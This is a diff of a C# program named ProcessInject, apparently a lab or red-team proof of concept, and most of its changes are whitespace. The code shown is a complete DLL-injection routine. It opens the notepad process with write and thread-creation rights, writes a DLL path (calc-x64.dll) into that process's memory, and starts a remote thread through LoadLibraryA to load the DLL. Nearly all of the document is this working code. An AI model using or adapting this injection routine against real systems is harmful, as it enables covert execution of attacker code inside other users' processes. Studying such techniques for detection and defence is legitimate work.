@@ -21,16 +21,13 @@ public class ProcessInject
     static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
-        uint dwSize, uint flAllocationType, uint flProtect);
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
 	
-	//[DllImport("kernel32.dll", SetLastError = true)]
-    //static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesRead);
-	[DllImport("kernel32.dll")]
-	static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);
+    [DllImport("kernel32.dll")]
+    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);
 
     [DllImport("kernel32.dll")]
     static extern IntPtr CreateRemoteThread(IntPtr hProcess,
@@ -53,41 +50,41 @@ public class ProcessInject
 		
         // Get process id
         Console.WriteLine("Get process by name...");
-		Process targetProcess = Process.GetProcessesByName("notepad")[0];
-		Console.WriteLine("Found procId: " + targetProcess.Id);
+	Process targetProcess = Process.GetProcessesByName("notepad")[0];
+	Console.WriteLine("Found procId: " + targetProcess.Id);
 		
         // Get handle of the process - with required privileges
-		Console.WriteLine("Getting handle to process...");
+	Console.WriteLine("Getting handle to process...");
         IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
         Console.WriteLine("Got procHandle: " + procHandle);
 		
         // Get address of LoadLibraryA and store in a pointer
-		Console.WriteLine("Getting loadlibrary pointer...");
+	Console.WriteLine("Getting loadlibrary pointer...");
         IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
-		Console.WriteLine("Loadlibrary pointer: " + loadLibraryAddr);
+	Console.WriteLine("Loadlibrary pointer: " + loadLibraryAddr);
 
         // Path to dll that will be injected
         string dllName = "C:\\calc-x64.dll";
 
         // Allocate memory for dll path and store pointer
-		Console.WriteLine("Allocating memory...");
+	Console.WriteLine("Allocating memory...");
         IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		Console.WriteLine("allocMemAddress: " + allocMemAddress);
+	Console.WriteLine("allocMemAddress: " + allocMemAddress);
 
         // Write path of dll to memory
-		Console.WriteLine("Writing content to memory...");
+	Console.WriteLine("Writing content to memory...");
         UIntPtr bytesWritten;
         bool resp1 = WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
 		
-		// Read contents of memory
-		int bytesRead = 0;
+	// Read contents of memory
+	int bytesRead = 0;
         byte[] buffer = new byte[24];
-		Console.WriteLine("Reading content from memory...");
-		ReadProcessMemory(procHandle, allocMemAddress, buffer, buffer.Length, ref bytesRead);
+	Console.WriteLine("Reading content from memory...");
+	ReadProcessMemory(procHandle, allocMemAddress, buffer, buffer.Length, ref bytesRead);
         Console.WriteLine("Data in memory: " + System.Text.Encoding.UTF8.GetString(buffer));
 		
         // Create a thread that will call LoadLibraryA with allocMemAddress as argument
-		Console.WriteLine("CreateRemoteThread");
+	Console.WriteLine("CreateRemoteThread");
         CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
         
         return 0;
